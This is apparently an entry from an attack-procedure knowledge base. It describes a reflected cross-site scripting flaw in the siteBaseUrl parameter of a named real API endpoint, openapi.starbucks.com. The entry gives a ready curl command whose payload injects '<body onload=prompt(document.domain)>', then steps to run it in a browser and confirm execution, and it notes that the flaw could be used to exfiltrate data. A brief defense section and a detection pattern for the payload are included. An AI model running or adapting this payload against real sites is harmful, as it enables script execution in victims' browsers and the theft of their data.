---
tags:
  - xss
  - javascript
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
sub_techniques: []
id: 6ba1af7b-483d-4a89-bdd2-037988cbdb1b
created_at: '2025-12-14T03:46:31.608Z'
updated_at: '2025-12-14T03:46:31.608Z'
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject JavaScript Payload via siteBaseUrl for Domain Prompt

## Summary

This procedure exploits the reflected XSS by injecting a payload into siteBaseUrl to break out of the URL context and execute JavaScript, demonstrated by prompting the document domain.

## Description

The siteBaseUrl parameter is reflected in an HTML href without sanitization, allowing a newline (%0a) to close the attribute and inject a <body> tag with onload event. When the victim loads the page, the JS executes in the browser context. This confirms control over the DOM and potential for further abuse like data exfiltration. Prerequisites include confirmed reflection from prior recon.

## Requirements

1. Valid endpoint access
2. URL encoding knowledge for payloads
3. Browser for execution testing

## Defense

Defensive measures and detection strategies:

- Validate siteBaseUrl against a whitelist of allowed domains
- Use URL encoding and context-aware escaping (e.g., for href)
- Log and alert on payloads containing %0a or script tags in parameters

## Objectives

1. Break out of URL context to HTML/JS
2. Execute arbitrary code in victim browser
3. Verify execution with a harmless prompt

## Instructions

### Step 1: Craft and Send XSS Payload

**Context**: Use %0a to inject after the base URL, adding onload JS to prompt domain.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl -G "https://openapi.starbucks.com/searchasyoutype/v1/search" -d "query=coffee" -d "siteBaseUrl=http://googl.com/%0a<body onload=prompt(document.domain)>" --header "x-api-key: YOUR_API_KEY"
```

> Response contains injected HTML. Load full URL in browser to trigger. Expected: Prompt with 'openapi.starbucks.com'.

### Step 2: Validate Execution

**Context**: Confirm JS runs without errors.

Inspect browser console for prompt execution.

> No errors and domain displayed indicate success.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques

-

## Commands Used

- [[commands/curl-inject-xss-payload]]

## Tools Used

-

## Tags

- [[xss]]
- [[JavaScript]]
- [[injection]]
